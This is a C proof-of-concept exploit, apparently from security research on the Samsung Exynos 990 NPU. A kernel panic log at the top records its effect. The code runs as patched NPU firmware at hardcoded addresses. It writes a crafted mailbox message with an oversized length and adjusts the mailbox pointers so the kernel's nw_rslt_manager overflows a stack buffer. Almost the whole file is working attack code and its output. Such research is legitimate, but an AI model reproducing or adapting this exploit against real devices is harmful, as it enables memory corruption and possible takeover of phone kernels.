// <0>[  110.936464]  [2:  npu-proto_AST:18063] Kernel panic - not syncing: stack-protector: Kernel stack is corrupted in: nw_rslt_manager+0x2e0/0x2e4
// <0>[  110.936480]  [2:  npu-proto_AST:18063] [Exynos][WDT][ EMERG]: watchdog reset is started to 30secs
// <6>[  110.936501]  [2:  npu-proto_AST:18063] [Exynos][WDT][  INFO]: TEMP: disable wdt keepalive
// <6>[  110.936519]  [2:  npu-proto_AST:18063] [Exynos][WDT][  INFO]: Watchdog cluster 0 stop done, WTCON = 115c18
// <6>[  110.936589]  [2:  npu-proto_AST:18063] [Exynos][WDT][  INFO]: s3c2410wdt_multistage_wdt_start: count=0x0000b32b, wtcon=00115c3c
// <6>[  110.936621]  [2:  npu-proto_AST:18063] [Exynos][WDT][  INFO]: Watchdog cluster 0 start, WTCON = 115c39
// <4>[  110.936631]  [2:  npu-proto_AST:18063] secdbg_wdd_set_start: wdd_info->init_done: true
// <6>[  110.936644]  [2:  npu-proto_AST:18063] debug-snapshot: item - log_kevents is disabled
// <3>[  110.936666]  [2:  npu-proto_AST:18063] mif: s5100_send_panic_noti_ext: Send CMD_KERNEL_PANIC message to CP
// <3>[  110.936678]  [2:  npu-proto_AST:18063] mif: pcie_send_ap2cp_irq: Reserve doorbell interrupt: PCI on/off working
// <7>[  110.936875]  [1:     SDHMS:A0.h: 9030] max77705_fg_read_avg_current: avg_current=0uA
// <4>[  110.938584]  [2:  npu-proto_AST:18063] CPU: 2 PID: 18063 Comm: npu-proto_AST FTT: 0 0 Tainted: G S      W         4.19.87 #1
// <4>[  110.938595]  [2:  npu-proto_AST:18063] Hardware name: Samsung X1SLTE EUR OPEN 21 based on EXYNOS990 (DT)
// <4>[  110.938605]  [2:  npu-proto_AST:18063] Call trace:
// <4>[  110.938620]  [2:  npu-proto_AST:18063]  dump_backtrace+0x0/0x1b0
// <4>[  110.938635]  [2:  npu-proto_AST:18063]  show_stack+0x14/0x20
// <4>[  110.938650]  [2:  npu-proto_AST:18063]  dump_stack+0xd4/0x110
// <4>[  110.938665]  [2:  npu-proto_AST:18063]  panic+0x174/0x2dc
// <4>[  110.938678]  [2:  npu-proto_AST:18063]  __stack_chk_fail+0x18/0x1c
// <4>[  110.938693]  [2:  npu-proto_AST:18063]  nw_rslt_manager+0x2e0/0x2e4


typedef char int8_t;
typedef short int16_t;
typedef int int32_t;
typedef long long int64_t;
typedef int32_t ssize_t;

typedef unsigned char uint8_t;
typedef unsigned short uint16_t;
typedef unsigned int uint32_t;
typedef unsigned long long uint64_t;
typedef uint32_t size_t;

typedef uint32_t uintptr_t;

#define MAILBOX_VERSION		    4
#define MAILBOX_SIGNATURE1		0x0C0FFEE0
#define MAILBOX_SIGNATURE2		0xC0DEC0DE
#define MAILBOX_SHARED_MAX		64

#define MAILBOX_H2FCTRL_LPRIORITY	0
#define MAILBOX_H2FCTRL_HPRIORITY	1
#define MAILBOX_H2FCTRL_MAX		    2

#define MAILBOX_F2HCTRL_RESPONSE	0
#define MAILBOX_F2HCTRL_REPORT		1
#define MAILBOX_F2HCTRL_MAX		    2

#define MAILBOX_GROUP_LPRIORITY	    0
#define MAILBOX_GROUP_HPRIORITY	    2
#define MAILBOX_GROUP_RESPONSE		3
#define MAILBOX_GROUP_REPORT		4
#define MAILBOX_GROUP_MAX		    5

struct mailbox_ctrl {
	uint32_t sgmt_ofs;
	uint32_t sgmt_len;
	uint32_t wptr;
	uint32_t rptr;
};

struct mailbox_hdr {
	uint32_t max_slot;
	uint32_t debug_time;
	uint32_t debug_code;
	uint32_t log_level;
	uint32_t log_dram;
	uint32_t reserved[8];
	struct mailbox_ctrl	h2fctrl[MAILBOX_H2FCTRL_MAX];
	struct mailbox_ctrl	f2hctrl[MAILBOX_F2HCTRL_MAX];
	uint32_t totsize;
	uint32_t version;
	uint32_t signature2;
	uint32_t signature1;
};

#define MESSAGE_MAGIC 0xC0DECAFE

struct message {
	uint32_t magic; /* magic number */
	uint32_t mid; /* message id */
	uint32_t command;
	uint32_t length; /* size in bytes */
	uint32_t self; /* self pointer */
	uint32_t data; /* the pointer of command */
};

void (*print)(char *format, ...) = (void (*)(char *, ...)) 0x17468;

struct mailbox_hdr* mailbox_hdr = (struct mailbox_hdr*) 0x7FF78;

int main() {
    print("PATCHED_NPU: hello from the NPU!\n");

    /* Getting a pointer in the mailbox to store our crafted message */
    struct message *message = (struct message *)(0x80000 - mailbox_hdr->f2hctrl[0].sgmt_ofs + 0x60);
    /* Crafting the message to trigger the buffer overflow */
    message->magic = MESSAGE_MAGIC;
    message->mid = 0;
    message->command = 0x64; /* COMMAND_DONE */
    message->length = 0x100; /* Size that will overflow the command in the kernel */
    message->self = 0x0;
    message->data = 0x60 + 0x18;

    /* Write pointer: points to the end of the crafted message/cmd + 0x100 bytes */
    mailbox_hdr->f2hctrl[0].wptr = 0x60 + 0x18 + 0x100;
    /* Read pointer: points to the beginning of the crafted message */
    mailbox_hdr->f2hctrl[0].rptr = 0x60;

    // print("PATCHED_NPU: message ret = %08x\n", (message + 1)->mid);
    // (message + 1)->mid = 0;
    // print("PATCHED_NPU: message ret = %08x\n", (message + 1)->mid);
    return 0;
}

int __attribute__((naked)) entry() {
    asm volatile(
        "PUSH {R4-R6,LR}\n"
        "bl main\n"
        "mov R0, $0\n"
        "POP {R4-R6,PC}"
    );
}
